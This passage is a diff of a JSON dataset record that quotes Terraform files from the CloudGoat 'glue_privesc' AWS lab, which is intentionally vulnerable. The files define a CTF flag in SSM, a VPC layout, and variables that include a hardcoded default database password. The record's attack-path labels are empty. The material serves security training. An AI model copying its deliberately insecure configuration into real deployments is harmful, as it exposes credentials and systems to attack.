+      "text": "resource \"aws_ssm_parameter\" \"flag\" {\n  name        = \"flag\"\n  description = \"this is secret secret-string\"\n  type        = \"String\"\n  value       = \"flag{Best-of-the-Best-12th-CGV}\"\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/variables.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/variables.tf",
+      "member_sha256": "2ac85cc732ff5f1485bbaa639910d432cdc76f3cf84282b76a3825f3447932c2",
+      "bytes": 1238,
+      "content_kind": "tf",
+      "text": "variable \"profile\" {\n  description = \"The AWS profile to use.\"\n  type        = string\n}\n\nvariable \"region\" {\n  description = \"The AWS region to deploy resources to.\"\n  default     = \"us-east-1\"\n  type        = string\n}\n\nvariable \"cgid\" {\n  description = \"CGID variable for unique naming.\"\n  type        = string\n}\n\nvariable \"cg_whitelist\" {\n  description = \"User's public IP address(es)\"\n  type        = list(string)\n}\n\nvariable \"stack-name\" {\n  description = \"Name of the stack.\"\n  default     = \"CloudGoat\"\n  type        = string\n}\n\nvariable \"scenario-name\" {\n  description = \"Name of the scenario.\"\n  default     = \"Glue_Privesc\"\n  type        = string\n}\n\nvariable \"ssh_public_key\" {\n  description = \"SSH Public Key\"\n  default     = \"../cloudgoat.pub\"\n  type        = string\n}\n\nvariable \"ssh_private_key\" {\n  description = \"SSH Private Key\"\n  default     = \"../cloudgoat\"\n  type        = string\n}\n\nvariable \"rds_database_name\" {\n  description = \"db_name\"\n  default     = \"bob12cgvdb\"\n  type        = string\n}\n\nvariable \"rds_username\" {\n  description = \"rds_db_username\"\n  default     = \"postgres\"\n  type        = string\n}\n\nvariable \"rds_password\" {\n  description = \"rds_db_passwrod\"\n  default     = \"bob12cgv\"\n  type        = string\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/vpc.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/glue_privesc/terraform/vpc.tf",
+      "member_sha256": "e74c3e259ec6f7e618b5fd00683dba444f04ce7b59f140cdf11ce76c037abdfa",
+      "bytes": 2403,
+      "content_kind": "tf",
+      "text": "resource \"aws_vpc\" \"vpc\" {\n  cidr_block           = \"10.10.0.0/16\"\n  enable_dns_hostnames = true\n  tags = {\n    Name = \"CloudGoat ${var.cgid} VPC\"\n  }\n}\n\n\nresource \"aws_internet_gateway\" \"internet_gateway\" {\n  vpc_id = aws_vpc.vpc.id\n  tags = {\n    Name = \"CloudGoat ${var.cgid}\"\n  }\n}\n\n\nresource \"aws_subnet\" \"public_1\" {\n  availability_zone = \"${var.region}a\"\n  cidr_block        = \"10.10.10.0/24\"\n  vpc_id            = aws_vpc.vpc.id\n\n  tags = {\n    Name = \"CloudGoat ${var.cgid} Public a\"\n  }\n}\n\nresource \"aws_subnet\" \"public_2\" {\n  availability_zone = \"${var.region}b\"\n  cidr_block        = \"10.10.20.0/24\"\n  vpc_id            = aws_vpc.vpc.id\n\n  tags = {\n    Name = \"CloudGoat ${var.cgid} Public b\"\n  }\n}\n\n\nresource \"aws_subnet\" \"private_1\" {\n  availability_zone = \"${var.region}a\"\n  cidr_block        = \"10.10.30.0/24\"\n  vpc_id            = aws_vpc.vpc.id\n\n  tags = {\n    Name = \"CloudGoat ${var.cgid} Private a\"\n  }\n}\n\nresource \"aws_subnet\" \"private_2\" {\n  availability_zone = \"${var.region}b\"\n  cidr_block        = \"10.10.40.0/24\"\n  vpc_id            = aws_vpc.vpc.id\n\n  tags = {\n    Name = \"CloudGoat ${var.cgid} Private 2\"\n  }\n}\n\n\nresource \"aws_route_table\" \"public_subnet\" {\n  vpc_id = aws_vpc.vpc.id\n\n  route {\n    cidr_block = \"0.0.0.0/0\"\n    gateway_id = aws_internet_gateway.internet_gateway.id\n  }\n\n  tags = {\n    Name = \"CloudGoat ${var.cgid} Route Table for Public Subnet\"\n  }\n}\n\nresource \"aws_route_table\" \"private_subnet\" {\n  vpc_id = aws_vpc.vpc.id\n  tags = {\n    Name = \"CloudGoat ${var.cgid} Route Table for Private Subnet\"\n  }\n}\n\n\nresource \"aws_route_table_association\" \"public_subnet\" {\n  for_each = {\n    1 = aws_subnet.public_1.id,\n    2 = aws_subnet.public_2.id\n  }\n\n  subnet_id      = each.value\n  route_table_id = aws_route_table.public_subnet.id\n}\n\nresource \"aws_route_table_association\" \"private_subnet\" {\n  for_each = {\n    1 = aws_subnet.private_1.id,\n    2 = aws_subnet.private_2.id\n  }\n\n  subnet_id      = each.value\n  route_table_id = aws_route_table.private_subnet.id\n}\n\n\nresource \"aws_vpc_endpoint\" \"s3\" {\n  vpc_id            = aws_vpc.vpc.id\n  service_name      = \"com.amazonaws.${var.region}.s3\"\n  vpc_endpoint_type = \"Gateway\"\n  route_table_ids = [\n    aws_route_table.public_subnet.id\n  ]\n}\n\nresource \"aws_vpc_endpoint\" \"glue\" {\n  vpc_id            = aws_vpc.vpc.id\n  service_name      = \"com.amazonaws.${var.region}.glue\"\n  vpc_endpoint_type = \"Interface\"\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "1b66ddaa2aa1b46f2eb59c15c37dcf4a0be38cbde1f1a96524ca3cc684a58019",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
